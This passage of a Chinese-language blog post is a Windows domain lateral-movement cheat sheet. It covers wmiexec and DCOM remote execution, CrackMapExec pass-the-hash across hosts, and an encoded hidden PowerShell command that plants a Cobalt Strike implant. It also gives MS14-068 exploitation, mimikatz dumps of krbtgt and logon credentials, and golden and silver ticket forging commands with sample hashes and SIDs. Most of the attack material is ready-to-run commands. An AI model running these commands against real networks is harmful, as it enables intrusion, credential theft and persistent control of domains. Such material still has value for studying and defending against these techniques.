+<p>wmiexec.exe domain/user:password@target-ip</p>
+<p>wmiexec.exe QWE/Administrator:p@<a href="mailto:&#x73;&#115;&#119;&#111;&#x72;&#x64;&#49;&#x32;&#51;&#46;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#50;&#48;&#x2e;&#49;&#x32;&#56;">&#x73;&#115;&#119;&#111;&#x72;&#x64;&#49;&#x32;&#51;&#46;&#x40;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#x38;&#46;&#50;&#48;&#x2e;&#49;&#x32;&#56;</a></p>
+</blockquote>
+<ol start="4">
+<li><a target="_blank" rel="noopener" href="https://github.com/sunorr/smbexec">smbexec</a></li>
+<li>DOM</li>
+</ol>
+<p><code>DCOM（分布式组件对象模型）</code>是微软的一系列概念和程序接口。通过DOCM,客户端程序对象能够向网络中的另一台计算机上的服务器程序对象发送请求。DCOM是基于组件对象模型（COM）的。COM提供了一套允许在同一台计算机上的客户端和服务器之间进行通信的接口（运行在Windows95及之后版本的操作系统中）</p>
+<p><code>Get-CimInstance</code>这个cmdlet（PowerShell命令行）默认只在powershell3.0以上版本中存在。因此只在windows server 2012及以上本本的操作系统才可以使用Get-CimInstance</p>
+<blockquote>
+<p> Get-CimInstance Win32_DCOMApplication //获取DCOM程序列表</p>
+</blockquote>
+<p><code>Windows7、Windows server 2008</code>中默认安装的是<code>powershell 2.0</code>。不支持Get-CimInstance。可以使用如下命令代替</p>
+<blockquote>
+<p>Get-WmiObject -Namespace ROOT\CIMV2 -Class Win32_DCOMApplication //获取DCOM程序列表</p>
+</blockquote>
+<p>获取到DCOM程序列表后，<strong>建立IPC</strong>，最后执行命令(这个方法需要关闭系统防火墙。在远程机器上执行命令时，必须使用具有本地管理员权限的账号)</p>
+<ul>
+<li>调用<code>MMC20.Application</code>远程执行命令</li>
+</ul>
+<blockquote>
+<p>$com=[activator]::CreateInstance([type]::GetTypeFromProgID(“MMC20.Application”,”ip”))<br>$com.Document.ActiveView.ExecuteShellCommand(‘cmd.exe’,$null,”/c calc.exe”,”Minimzed”)</p>
+</blockquote>
+<ul>
+<li>调用<code>9BA05972-F6A8-11CF-A442-00A0C90A8F39</code></li>
+</ul>
+<blockquote>
+<p>$com = [Type]::GetTypeFromCLSID(‘9BA05972-F6A8-11CF-A442-00A0C90A8F39’, “ip”)<br>$obj = [System.Activator]::CreateInstance($com)<br>$item = $obj.item()<br>$item.Document.Application.ShellExecute(“cmd.exe”,”/c calc.exe”, “c:\windows\system32”,$null,0)</p>
+</blockquote>
+<ol start="7">
+<li><strong>批量移动</strong></li>
+</ol>
+<p>CrackMapExec集成了wmiexec、atexe、smbexec，集成了smb扫描,口令爆破等功能,非常适合拿来快速移动</p>
+<p>其中，批量传递hash：(88,90多个目标使用相同hash传递)</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.73.147.90</span> <span class="hljs-number">10.73.147.88</span> -u administrator -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de<br><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.73.147.90</span> <span class="hljs-number">10.73.147.88</span> -u administrator -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de  -x <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>配合cs上马</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">cme</span> smb <span class="hljs-number">10.211.55.51</span>  <span class="hljs-number">10.211.55.52</span> -u administrator  -H <span class="hljs-number">852</span>a<span class="hljs-number">844</span>adfce<span class="hljs-number">18</span>f<span class="hljs-number">66009</span>b<span class="hljs-number">4</span>f<span class="hljs-number">14</span>e<span class="hljs-number">0</span>a<span class="hljs-number">98</span>de -x <span class="hljs-string">&quot;powershell -nop -w hidden -encodedcommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0...&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h2 id="Pass-The-Ticket"><a href="#Pass-The-Ticket" class="headerlink" title="Pass The Ticket"></a>Pass The Ticket</h2><h3 id="Kerberos协议认证过程"><a href="#Kerberos协议认证过程" class="headerlink" title="Kerberos协议认证过程"></a>Kerberos协议认证过程</h3><p>Kerberos协议是一种基于第三方可信主机的计算机网络协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。Kerberos协议在在内网域渗透中至关重要，白银票据、黄金票据、攻击域控等都离不开kerberos协议。</p>
+<p><strong>关键角色：</strong></p>
+<ul>
+<li><strong>Domain Controller (域控制器)，简称DC，一台计算机，实现用户、计算机的统一管理。</strong></li>
+<li><strong>Key Distribution Center(秘钥分发中心)，简称KDC，默认安装在域控里，包括AS和TGS。</strong> </li>
+<li><strong>Authentication Service(身份验证服务)，简称AS，用于KDC对Client认证。</strong> </li>
+<li><strong>Ticket Grantng Service (票据授予服务)，简称TGS，用于KDC向Client和Server分发Session Key（临时key）。</strong> </li>
+<li><strong>Active Directory(活动目录)，简称AD，用于存储用户、用户组、域相关的信息。</strong> </li>
+<li><strong>Client 客户端，指用户。</strong> </li>
+<li><strong>Server 服务端，可能是某台计算机，也可能是某个服务。</strong></li>
+</ul>
+<p>打个比方：当whoami要和bunny进行通信的时候，whoami就需要向bunny证明自己是whoami，直接的方式就是whoami用二人之间的秘密做秘钥加密明文文字生成密文，把密文和明文文字一块发送给bunny，bunny再用秘密解密得到明文，把明文和明文文字进行对比，若一致，则证明是whoami。</p>
+<p>但是网络中，密文和文字很有可能被窃取，并且只要时间足够，总能破解得到秘钥。所以不能使用这种长期有效的秘钥，要改为短期的临时秘钥。那么这个临时秘钥就需要一个第三方可信任的机构来提供，即KDC（Key Distribution Center）。</p>
+<p>下面讲一下详细的认证步骤，大概分为三个阶段：</p>
+<p><strong>AS-REQ—AS-REP阶段：</strong></p>
+<p>首先Client用自己的哈希值NTLM-hash对timestamp、client-info、server-info等数据进行加密，发送给AS，向AS请求TGT票据。（<strong>AS-REQ</strong>）</p>
+<p>当AS收到Client发来的信息后，AS会先向域控AD请求，询问是否有此Client用户，如果有的话，就会取出该Client的NTLM hash，然后生成一个随机秘钥称为Session-Key as（临时秘钥Session-Key）。并使用Client NTLM-hash 加密 Session-key as 作为一部分内容。</p>
+<p>还有一部分内容就是TGT：使用KDC一个特定账户krbtgt的NTLM-hash对Session-key as、timestamp、Client-info进行的加密。然后将这两部分回复给Client。（<strong>AS-REP</strong>）</p>
+<p>该阶段是Client和AS的认证。</p>
+<p><strong>TGS-REQ—TGS-REP阶段：</strong></p>
+<p>Client 收到AS发来的AS-REP后，先使用自身的 NTLM Hash 解密得到 Session-key as，然后使用 Session-key as 对 Client-Info、timestamp、Server-Info 加密作为一部分，加上TGT ，一并发送给 KDC中的 TGS。（<strong>TGS-REQ</strong>）</p>
+<p>TGS 收到请求后，使用 krbtgt 的 NTLM Hash 解密 TGT，得到 Session-key  as、timestamp、Client-info，同时，使用 TGT 解密出的 Session-key as  解密第一部分内容，得到Client-info、timestamp。  比对这两部分解密得到的内容以验证是否通过。通过后，生成一个新的随机秘钥(Session-Key tgs)，并向Client回复<strong>TGS-REP的</strong>两部分内容：</p>
+<ol>
+<li>一部分是Session-key as 加密的 Session-key tgs</li>
+<li>另一部分是ST(ticket)，即Server NTLM-hash加密的数据(Session-key tgs、timestamp、Client-info)</li>
+</ol>
+<p>该阶段是Client和KDC的通信。</p>
+<p><strong>AP-REQ—AP-REP阶段：</strong></p>
+<p>Client收到<strong>TGS-REP后</strong>，先用自己保存的Session-key as解密出了Session-key tgs。再使用Session-key tgs加密Client-info、timestamp作为一部分内容，另一部分是ST，一并发送给Server。（<strong>AP-REQ</strong>）</p>
+<p>Server 收到Client发来的<strong>AP-REQ</strong>后，用自身的NTLM Hash解密了ST，得到Session-key tgs，再用Session-key  tgs解密第一部分得到Client-info、timestamp。然后与ST的Client-info、timestamp进行对比。timestamp 一般时间为8小时。验证通过后，回复<strong>AP-REP</strong>，最终建立通信。</p>
+<p>上面的PTH攻击，需要获取到NTLM，必须要获得目标的管理员权限，如果没有管理员权限下，要么提权，要么可以试一试PTT</p>
+<h3 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a>MS14-068</h3><p>PAC是用来验证Client的访问权限的，它会被放在TGT里发送给Client，然后由Client发送给TGS。</p>
+<p>Windows域中使用kerberos协议过程中，为了让服务器判断Client是否有权限访问服务，微软在Windows平台上对Kerberos协议进行了一些扩充，即在协议中增加了PAC（Privilege Attribute Certificate），特权属性证书，也就是这个PAC造成了MS14-068这个漏洞。</p>
+<p>MS14-068是密钥分发中心（KDC）服务中的Windows漏洞。它允许经过身份验证的用户在其Kerberos票证（TGT）中<strong>插入任意的PAC</strong>（表示所有用户权限的结构）。该漏洞位于kdcsvc.dll域控制器的密钥分发中心(KDC)中。<strong>普通用户可以通过呈现具有改变了PAC的Kerberos TGT来获得票证，进而伪造票据获得管理员权限。</strong></p>
+<p><strong>利用条件：</strong></p>
+<blockquote>
+<p>获取任意用户SID</p>
+<p>域内任意账号的密码</p>
+</blockquote>
+<p><strong>利用：</strong></p>
+<p>找利用工具：<a target="_blank" rel="noopener" href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068</a></p>
+<p>生成TGT(ccache)</p>
+<blockquote>
+<p>MS14-068 -u <a href="mailto:&#116;&#x65;&#115;&#116;&#x40;&#x51;&#87;&#x45;&#x2e;&#105;&#x6f;">&#116;&#x65;&#115;&#116;&#x40;&#x51;&#87;&#x45;&#x2e;&#105;&#x6f;</a> -s S-1-5-21-264158955-2367710963-2250079592-1105 -d DC.QWE.io -p p@ssword123.</p>
+</blockquote>
+<p>mimikatz注入票据</p>
+<blockquote>
+<p>kerberos::purge  //清空所有凭证，有其他凭证会影响伪造</p>
+<p>kerberos::list       //列出所有凭证</p>
+<p>kerberos::ptc       //注入票据</p>
+</blockquote>
+<blockquote>
+<p>net use \\DC        …</p>
+</blockquote>
+<h3 id="黄金票据-Golden-ticket"><a href="#黄金票据-Golden-ticket" class="headerlink" title="黄金票据(Golden ticket)"></a>黄金票据(Golden ticket)</h3><p>在Windows的kerberos认证过程中，Client将自己的信息发送给KDC，然后KDC使用krbtgt用户的Hash作为密钥进行加密，生成TGT。那么如果获取到了krbtgt的Hash值，不就可以伪造任意的tgt了吗。<strong>因为krbtgt只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个后门。</strong></p>
+<blockquote>
+<p>先假设这么一种情况，原先已拿到的域内所有的账户Hash，包括krbtgt这个账户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置krbtgt密码，基于此条件，我们还能利用该票据重新获得域管理员权限，<strong>利用krbtgt的HASH值可以伪造生成任意的TGT(mimikatz)，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于Kerberos认证的任何服务</strong>。</p>
+</blockquote>
+<p>攻击者再使用黄金票据进行票据传递攻击时，通常要掌握以下信息：</p>
+<ul>
+<li>需要伪造的域管理员用户名</li>
+<li>完整的域名</li>
+<li>域SID</li>
+<li>krbtgt的NTLM Hash</li>
+</ul>
+<p><strong>利用：</strong></p>
+<p>登录域控抓取krbtgt用户的Hash值并获取域SID</p>
+<p><strong>经测试，win10/server2022抓取会关机，已在此设备上禁用对动态访问控制的Kerberos 支持</strong></p>
+<blockquote>
+<p>privilege::debug</p>
+<p>lsadump::lsa /patch        // 专用于在域控制器上导出用户密码或hash</p>
+<p>或者：</p>
+<p>lsadump::dcsync /domain:QWE.io /user:krbtgt  //取得的sid值后面三位去除</p>
+</blockquote>
+<ul>
+<li>生成票据后注入</li>
+</ul>
+<p>然后在普通域用户机器，用mimikatz生成名为ticket.kirbi的TGT凭证，用户名为Administrator </p>
+<blockquote>
+<p>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-979886063-1111900045-1414766810 /krbtgt:7c4ed692473d4b4344c3ba01c5e6cb63 /ticket:ticket.kirbi</p>
+</blockquote>
+<p>注入TGT票据</p>
+<blockquote>
+<p>kerberos::ptt ticket.kirbi</p>
+</blockquote>
+<p>查看tgt</p>
+<blockquote>
+<p>kerberos::tgt</p>
+</blockquote>
+<blockquote>
+<p>net use \\DC        …</p>
+</blockquote>
+<ul>
+<li>生成并直接导入</li>
+</ul>
+<blockquote>
+<p>privilege::debug<br>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-2189311154-2766837956-1982445477 /krbtgt:7aad81625fab43e7fdb3cd9f399c060c /ptt  //生成票据并导入</p>
+<p>或者也可以使用krbtgt的AES-256<br>privilege::debug<br>kerberos::golden /user:Administrator /domain:QWE.io /sid:S-1-5-21-2189311154-2766837956-1982445477 /aes256:93c335cce03858c917fa2ea98ca79f0b791c93c33ab17936784548114648cda7  /ptt</p>
+</blockquote>
+<h3 id="白银票据-Silver-ticket"><a href="#白银票据-Silver-ticket" class="headerlink" title="白银票据(Silver ticket)"></a>白银票据(Silver ticket)</h3><p>白银票据不同于黄金票据，白银票据的利用过程是伪造TGS，通过已知的授权服务密码生成一张可以访问该服务的TGT。因为在票据生成过程中不需要使用KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由KDC颁发TGT，并且在生成伪造的TGT得20分钟内，TGS不会对该TGT的真伪进行效验。</p>
+<p>白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用krbtgt账号的密码哈希值，因此更加隐蔽。</p>
+<p>攻击者要利用白银票据进行票据传递攻击，需要掌握下面几个信息：</p>
+<ul>
+<li>域名</li>
+<li>域SID</li>
+<li>目标服务器的FQDN</li>
+<li>可利用的服务</li>
+<li>服务账号的NTLM Hash</li>
+<li>要伪造的用户名</li>
+</ul>
+<p><strong>利用：</strong></p>
+<p>登录域控，抓取共享服务账号hash</p>
+<blockquote>
+<p>privilege::debug</p>
+<p>sekurlsa::logonpasswords</p>
+</blockquote>
+<p>在普通域用户中，生成白银票据</p>
+<blockquote>
+<p>kerberos::golden /domain:QWE.io /sid:SID /target:DC.QWE.io /rc4:hash /service:cifs /user:admin /ptt</p>
+</blockquote>
+<p>其中</p>
+<blockquote>
+<p>/service:目标服务器上面的kerberos服务，此处为cifs</p>
+<figure class="highlight mathematica"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs mathematica">服务名称                    同时需要的服务<br><span class="hljs-variable">WMI</span>                        <span class="hljs-variable">HOST</span>、<span class="hljs-variable">RPCSS</span><br><span class="hljs-variable">PowerShell</span> <span class="hljs-variable">Remoting</span>        <span class="hljs-variable">HOST</span>、<span class="hljs-variable">HTTP</span><br><span class="hljs-variable">WinRM</span>                      <span class="hljs-variable">HOST</span>、<span class="hljs-variable">HTTP</span><br><span class="hljs-variable">Scheduled</span> <span class="hljs-built_in">Tasks</span>            <span class="hljs-variable">HOST</span><br><span class="hljs-variable">Windows</span> <span class="hljs-built_in">File</span> <span class="hljs-built_in">Share</span>         <span class="hljs-variable">CIFS</span><br><span class="hljs-variable">LDAP</span>                       <span class="hljs-variable">LDAP</span><br><span class="hljs-variable">Windows</span> <span class="hljs-variable">Remote</span> <span class="hljs-variable">Server</span>      <span class="hljs-variable">RPCSS</span>、<span class="hljs-variable">LDAP</span>、<span class="hljs-variable">CIFS</span><br></code></pre></td></tr></table></figure>
+
+<p>/rc4:域控的计算机账户ntlm hash</p>
+<p>/user:要伪造的用户名(<strong>任意！包括不存在的用户</strong>)</p>
+<p>mimikatz.exe “kerberos::golden /domain:域 /sid:SID /target:域全称 /service:要访问的服务 /rc4:NTLM /user:silver /ptt”即可生成并导入Silver Ticket</p>
+</blockquote>
+<h3 id="黄金票据和白银票据的不同"><a href="#黄金票据和白银票据的不同" class="headerlink" title="黄金票据和白银票据的不同"></a>黄金票据和白银票据的不同</h3><p>访问权限不同：</p>
+<ul>
+<li>黄金票据Golden Ticket：伪造TGT，可以获取任何Kerberos服务权限</li>
+<li>白银票据Silver Ticket：伪造TGS，只能访问指定的服务</li>
+</ul>
+<p>加密方式不同：</p>
+<ul>
+<li>Golden Ticket由krbtgt的Hash加密</li>
+<li>Silver Ticket 由服务账号（通常为计算机账户）Hash加密</li>
+<li>认证流程不同：</li>
+<li>Golden Ticket的利用过程需要访问域控，</li>
+<li>而Silver Ticket不需要</li>
+</ul>
+<p>隐蔽性不同：</p>
+<ul>
+<li>白银票据依赖于服务账号的密码散列值，而黄金票据需要利用krbtgt账号的密码散列值，因此白银票据更隐蔽</li>
+</ul>
+
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/network/">network</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/knowledge/">knowledge</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2022/03/27/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">
+                        <span class="hidden-mobile">权限提升</span>
+                        <span class="visible-mobile">Next</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+              <!-- Comments -->
+              <article class="comments" id="comments" lazyload>
+                
+                  
+                
+                
+  <div id="valine"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#valine', function() {
+      Fluid.utils.createScript('https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js', function() {
+        var options = Object.assign(
+          {"appId":"lCUF08cIQ1BPgn7X9fjMMTbe-MdYXbMMI","appKey":"RSMbcrKIFnecyMgNGc47g3tN","placeholder":"说点什么","path":"window.location.pathname","avatar":"retro","meta":["nick","mail","link"],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"requiredFields":[]},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          Fluid.plugins.initFancyBox('#valine .vcontent img:not(.vemoji)');
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+              </article>
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;TOC</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">keyword</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="http://kIl3rr.github.io" target="_blank" rel="nofollow noopener"><span>kIl3rr</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> <div> <span id="timeDate">载入天数...</span> <span id="times">载入时分秒...</span> <script src="/js/duration.js"></script> </div> 
+  </div>
+  
+  <div class="statistics">
+    
+    
+
+    
+      
+        <!-- 不蒜子统计PV -->
+        <span id="busuanzi_container_site_pv" style="display: none">
+            总访问量 
+            <span id="busuanzi_value_site_pv"></span>
+             次
+          </span>
+      
+      
+        <!-- 不蒜子统计UV -->
+        <span id="busuanzi_container_site_uv" style="display: none">
+            总访客数 
+            <span id="busuanzi_value_site_uv"></span>
+             人
+          </span>
+      
+    
+  </div>
+
+
+  
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  
+    <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+  
+  
+    <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+  
+  
+    <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+  
+
+
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+    <!-- Google Analytics -->
+    <script defer>
+      window.ga = window.ga || function () { (ga.q = ga.q || []).push(arguments) };
+      ga.l = +new Date;
+      ga('create', 'G-SL9T1KRBQY', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <script async src='https://www.google-analytics.com/analytics.js'></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
